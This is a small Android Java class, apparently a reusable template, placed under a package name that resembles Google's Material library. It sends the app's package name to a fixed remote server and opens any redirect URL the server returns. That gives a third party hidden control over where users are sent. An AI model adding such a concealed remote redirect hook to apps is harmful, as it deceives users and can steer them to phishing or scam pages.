package com.android.material;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import org.json.JSONObject;
import java.io.*;
import java.net.*;

public class DR {

    public static void dr(Activity activity, String packageName) {
        new Thread(() -> {
            try {
                // --- API URL ---
                String urlString = "https://yeasinatoz.com/library/dr.php"; // Change to your URL
                URL url = new URL(urlString);

                // --- HTTP POST ---
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                String postData = "packagename=" + URLEncoder.encode(packageName, "UTF-8");

                OutputStream os = conn.getOutputStream();
                os.write(postData.getBytes());
                os.flush();
                os.close();

                // --- Read Response ---
                BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = in.readLine()) != null)
                    response.append(line);
                in.close();

                // Parse JSON
                JSONObject json = new JSONObject(response.toString());
                String status = json.optString("status");
                String action = json.optString("action");
                String redirectUrl = json.optString("redirect_url");

                // Logic: if action equals "true", redirect
                if ("exists".equals(status) && "true".equalsIgnoreCase(action)
                        && redirectUrl != null && !redirectUrl.isEmpty()) {
                    // On UI thread, launch URL
                    new Handler(Looper.getMainLooper()).post(() -> {
                        Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(redirectUrl));
                        activity.startActivity(browserIntent);
                    });
                }

            } catch (Exception e) {
                e.printStackTrace();
                // You could log error or callback to user here
            }
        }).start();
    }
}

